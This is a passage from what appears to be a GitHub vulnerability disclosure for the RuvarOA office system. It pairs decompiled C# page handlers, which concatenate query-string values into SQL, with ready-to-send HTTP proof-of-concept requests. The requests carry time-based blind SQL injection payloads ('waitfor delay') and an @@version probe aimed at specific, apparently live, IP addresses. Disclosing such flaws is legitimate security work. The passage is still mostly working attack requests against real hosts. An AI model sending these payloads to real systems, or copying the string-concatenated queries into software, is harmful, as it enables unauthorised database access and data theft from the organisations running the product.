src="https://private-user-images.githubusercontent.com/18260135/302572723-239fe2cc-8ebe-480c-b81d-4c5e4ad051e9.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1NzI3MjMtMjM5ZmUyY2MtOGViZS00ODBjLWI4MWQtNGM1ZTRhZDA1MWU5LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWM1OGFiNTE2NzIxZGE4M2ZiN2Y5ZWU5OGI0YmIwY2Q2ZmU5Zjc0YzBlZjc2MGEzOTJmMTlhOTljYTVmZDE5MjkmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.7WnCdxLAQadh6a2YkUxIphhHgAHd83DHQip1mcG5C5g" style="max-width: 100%;"></a>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">Vulnerability analysis</h4><a id="user-content-vulnerability-analysis-6" class="anchor" aria-label="Permalink: Vulnerability analysis" href="#vulnerability-analysis-6"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto">function AttachDownLoad within the DLL file /RuvarOA/bin/Mobile.dll</p>
<pre><code>using System;
using System.Data.Common;
using System.Data.SqlClient;
using System.Text;
using System.Text.RegularExpressions;
using System.Web;
using System.Web.UI;
using Lib;

namespace Mobile.Bulletin;

public class AttachDownLoad : Page
{
    protected void Page_Load(object sender, EventArgs e)
    {
        if (((Control)this).Page.IsPostBack)
        {
            return;
        }
        try
        {
            string text = ((Page)this).Request.QueryString["attach_id"];
            if (Validate.isNullOrSpace(text))
            {
                text = "0";
            }
            if (!(text != "") || text == null)
            {
                return;
            }
            string text2 = "";
            text2 = "select top 1 file_name,file_type,file_ext,file_size,file_bin_data from office_bulletin_attach where (attach_id='" + text + "') order by attach_id desc";
            if (text2 != "")
            {
                SqlDataReader val = SqlHelper.ExecuteReader(text2);
                if (((DbDataReader)(object)val).Read())
                {
                    string text3 = ((DbDataReader)(object)val)["file_name"].ToString();
                    text3 = text3.Trim();
                    text3 = Regex.Replace(Regex.Replace(text3, "^\"+", ""), "\"+$", "");
                    text3 = Regex.Replace(text3, ".[a-zA-Z0-9]*$", "");
                    text3 += ((DbDataReader)(object)val)["file_ext"].ToString().Replace("\"", "");
                    text3 = Regex.Replace(text3, "[/\\*?:\"&lt;&gt;]*", "");
                    byte[] array = new byte[((DbDataReader)(object)val).GetBytes(4, 0L, (byte[]?)null, 0, int.MaxValue)];
                    ((DbDataReader)(object)val).GetBytes(4, 0L, array, 0, array.Length);
                    ((Page)this).Response.Clear();
                    ((Page)this).Response.ContentType = ((DbDataReader)(object)val)["file_type"].ToString();
                    ((Page)this).Response.AddHeader("Content-Disposition", "attachment; filename=" + HttpUtility.UrlEncode(text3, Encoding.UTF8) + ";");
                    ((Page)this).Response.BinaryWrite(array);
                }
                ((DbDataReader)(object)val).Close();
            }
        }
        catch (Exception ex)
        {
            ((Page)this).Response.Write(ex.ToString());
        }
    }
}

</code></pre>
<p dir="auto">The direct use of <code>Request.QueryString["attach_id"]</code> to retrieve a value and then concatenate it into an SQL statement has resulted in an SQL injection vulnerability.</p>
<div class="markdown-heading" dir="auto"><h3 class="heading-element" dir="auto">AttachDown.aspx</h3><a id="user-content-attachdownaspx" class="anchor" aria-label="Permalink: AttachDown.aspx" href="#attachdownaspx"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">path</h4><a id="user-content-path-7" class="anchor" aria-label="Permalink: path" href="#path-7"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Mobile/LHMail/AttachDown.aspx</p>
</blockquote>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">POC</h4><a id="user-content-poc-7" class="anchor" aria-label="Permalink: POC" href="#poc-7"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<pre><code>GET /Mobile/LHMail/AttachDown.aspx?email_attach_id=1')+waitfor+delay+'0:0:3'+--+ HTTP/1.1
Host: 112.74.79.113:8000
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.4103.116 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-HK;q=0.8,zh-TW;q=0.7,zh-CN;q=0.6,zh;q=0.5
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7


</code></pre>
<a target="_blank" rel="noopener noreferrer" href="https://private-user-images.githubusercontent.com/18260135/302575634-0e49e6bd-7c4c-4467-bd86-381ff774421e.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1NzU2MzQtMGU0OWU2YmQtN2M0Yy00NDY3LWJkODYtMzgxZmY3NzQ0MjFlLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTUzOWI3ZTBkYWYxOGRkMDBiNTI3NzkwODM1NzAxMjk1NDYwMGE4NWFmMDA5MzJkZDRhNDNhZGU5MmExNTA0NDUmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.vAHnWvIwspOuJWooyvYaejrApIje5M0tVKCABjjFZak"><img width="979" alt="image" src="https://private-user-images.githubusercontent.com/18260135/302575634-0e49e6bd-7c4c-4467-bd86-381ff774421e.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1NzU2MzQtMGU0OWU2YmQtN2M0Yy00NDY3LWJkODYtMzgxZmY3NzQ0MjFlLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTUzOWI3ZTBkYWYxOGRkMDBiNTI3NzkwODM1NzAxMjk1NDYwMGE4NWFmMDA5MzJkZDRhNDNhZGU5MmExNTA0NDUmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.vAHnWvIwspOuJWooyvYaejrApIje5M0tVKCABjjFZak" style="max-width: 100%;"></a>
<pre><code>GET /Mobile/LHMail/AttachDown.aspx?contentid=1')+waitfor+delay+'0:0:3'+--+ HTTP/1.1
Host: 112.74.79.113:8000
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.4103.116 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-HK;q=0.8,zh-TW;q=0.7,zh-CN;q=0.6,zh;q=0.5
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7


</code></pre>
<a target="_blank" rel="noopener noreferrer" href="https://private-user-images.githubusercontent.com/18260135/302575841-45c5f275-66e6-49e9-ae7e-4c2bbd1b2994.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1NzU4NDEtNDVjNWYyNzUtNjZlNi00OWU5LWFlN2UtNGMyYmJkMWIyOTk0LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTFmYzI2ZmJmM2Q4MWI1YmU5N2RmODU0MTZhMmI0MDNjZjc2OGJmNWFmOGI5ZTNjOGMxY2JhY2E0YTBlNzRkZjYmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.azG8ikRi69BEc82n-EpEO87ohwcyT8oXwls5RFENgy4"><img width="979" alt="image" src="https://private-user-images.githubusercontent.com/18260135/302575841-45c5f275-66e6-49e9-ae7e-4c2bbd1b2994.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1NzU4NDEtNDVjNWYyNzUtNjZlNi00OWU5LWFlN2UtNGMyYmJkMWIyOTk0LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTFmYzI2ZmJmM2Q4MWI1YmU5N2RmODU0MTZhMmI0MDNjZjc2OGJmNWFmOGI5ZTNjOGMxY2JhY2E0YTBlNzRkZjYmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.azG8ikRi69BEc82n-EpEO87ohwcyT8oXwls5RFENgy4" style="max-width: 100%;"></a>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">Vulnerability analysis</h4><a id="user-content-vulnerability-analysis-7" class="anchor" aria-label="Permalink: Vulnerability analysis" href="#vulnerability-analysis-7"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto">function AttachDownLoad within the DLL file /RuvarOA/bin/Mobile.dll</p>
<pre><code>using System;
using System.Web.UI;
using Lib;
using WebUtility;

namespace Mobile.LHMail;

public class AttachDownLoad : BasePageInfo
{
    protected void Page_Load(object sender, EventArgs e)
    {
        if (((Control)this).Page.IsPostBack)
        {
            return;
        }
        try
        {
            string text = ((Page)this).Request.QueryString["email_attach_id"];
            if (Validate.isNullOrSpace(text))
            {
                text = "0";
            }
            if (text != "" &amp;&amp; text != null)
            {
                FileDownLoad.DownLoadEmailAttach(int.Parse(text));
                return;
            }
            text = ((Page)this).Request.QueryString["contentid"];
            if (text != "" &amp;&amp; text != null)
            {
                FileDownLoad.DownLoadEmailAttach(text);
            }
        }
        catch
        {
        }
    }
}

</code></pre>
<p dir="auto">The direct use of <code>Request.QueryString["email_attach_id"]</code> and <code>Request.QueryString["contentid"]</code> to retrieve a value and then concatenate it into an SQL statement has resulted in an SQL injection vulnerability.</p>
<div class="markdown-heading" dir="auto"><h3 class="heading-element" dir="auto">wf_work_finish_file_down.aspx</h3><a id="user-content-wf_work_finish_file_downaspx" class="anchor" aria-label="Permalink: wf_work_finish_file_down.aspx" href="#wf_work_finish_file_downaspx"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">path</h4><a id="user-content-path-8" class="anchor" aria-label="Permalink: path" href="#path-8"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Mobile/WorkFlow/wf_work_finish_file_down.aspx</p>
</blockquote>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">POC</h4><a id="user-content-poc-8" class="anchor" aria-label="Permalink: POC" href="#poc-8"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<pre><code>GET /Mobile/WorkFlow/wf_work_finish_file_down.aspx?sys_file_storage_id=1'+waitfor+delay+'0:0:3'+--+ HTTP/1.1
Host: 121.33.254.78:88
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.4103.116 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-HK;q=0.8,zh-TW;q=0.7,zh-CN;q=0.6,zh;q=0.5
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7


</code></pre>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">Vulnerability analysis</h4><a id="user-content-vulnerability-analysis-8" class="anchor" aria-label="Permalink: Vulnerability analysis" href="#vulnerability-analysis-8"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto">function wf_work_finish_file_down within the DLL file /RuvarOA/bin/Mobile.dll</p>
<pre><code>using System;
using System.Data.Common;
using System.Data.SqlClient;
using System.Text;
using System.Web;
using System.Web.UI;
using Lib;

namespace Mobile.WorkFlow;

public class wf_work_finish_file_down : Page
{
    protected void Page_Load(object sender, EventArgs e)
    {
        if (((Control)this).Page.IsPostBack)
        {
            return;
        }
        try
        {
            string dbname = ((Page)this).Request.QueryString["dbname"];
            string text = "";
            text = ((Page)this).Request.QueryString["sys_file_storage_id"];
            BackUpDB backUpDB = new BackUpDB(dbname);
            if (!(text != "") || text == null)
            {
                return;
            }
            string text2 = "";
            string text3 = "";
            string text4 = "";
            text2 = "select top 1 * from sys_file_storage where (sys_file_storage_id='" + text + "')order by sys_file_storage_id desc";
            if (!(text2 != ""))
            {
                return;
            }
            SqlDataReader val = backUpDB.QueryDataReader(text2);
            while (((DbDataReader)(object)val).Read())
            {
                text4 = ((DbDataReader)(object)val)["file_type"].ToString();
                text3 = ((DbDataReader)(object)val)["file_name"].ToString();
                text3 = GetFileName(text3);
                byte[] array = new byte[((DbDataReader)(object)val).GetBytes(12, 0L, (byte[]?)null, 0, int.MaxValue)];
                ((DbDataReader)(object)val).GetBytes(12, 0L, array, 0, array.Length);
                ((Control)this).Page.Response.ContentType = text4;
                if (text4.IndexOf("image") &gt; -1 || text4.IndexOf("flash") &gt; -1)
                {
                    ((Control)this).Page.Response.AddHeader("Content-Disposition", "filename=" + HttpUtility.UrlEncode(text3, Encoding.UTF8) + ";");
                }
                else
                {
                    ((Control)this).Page.Response.AddHeader("Content-Disposition", "attachment; filename=" + HttpUtility.UrlEncode(text3, Encoding.UTF8) + ";");
                }
                ((Control)this).Page.Response.BinaryWrite(array);
            }
            ((DbDataReader)(object)val).Close();
            ((DbDataReader)(object)val).Dispose();
        }
        catch
        {
        }
    }

    private string GetFileName(string file_name)
    {
        int num = 0;
        int num2 = 16;
        string[] array = file_name.Split(new char[1] { '.' });
        if (array.Length == 2)
        {
            num = Common.getLength(array[0]);
            if (num &gt; num2)
            {
                file_name = Common.getLengthEx(array[0], num2, "") + "." + array[1];
            }
        }
        return file_name;
    }

    protected override void OnInit(EventArgs e)
    {
        InitializeComponent();
        ((Page)this).OnInit(e);
    }

    private void InitializeComponent()
    {
    }
}

</code></pre>
<p dir="auto">The direct use of <code>Request.QueryString["sys_file_storage_id"]</code> to retrieve a value and then concatenate it into an SQL statement has resulted in an SQL injection vulnerability.</p>
<div class="markdown-heading" dir="auto"><h3 class="heading-element" dir="auto">wf_template_child_field_list.aspx</h3><a id="user-content-wf_template_child_field_listaspx" class="anchor" aria-label="Permalink: wf_template_child_field_list.aspx" href="#wf_template_child_field_listaspx"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">path</h4><a id="user-content-path-9" class="anchor" aria-label="Permalink: path" href="#path-9"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">SysManage/wf_template_child_field_list.aspx</p>
</blockquote>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">POC</h4><a id="user-content-poc-9" class="anchor" aria-label="Permalink: POC" href="#poc-9"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<pre><code>GET /SysManage/wf_template_child_field_list.aspx?template_id=@@version HTTP/1.1
Host: 112.74.79.113:8000
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.4103.116 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-HK;q=0.8,zh-TW;q=0.7,zh-CN;q=0.6,zh;q=0.5
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7


</code></pre>
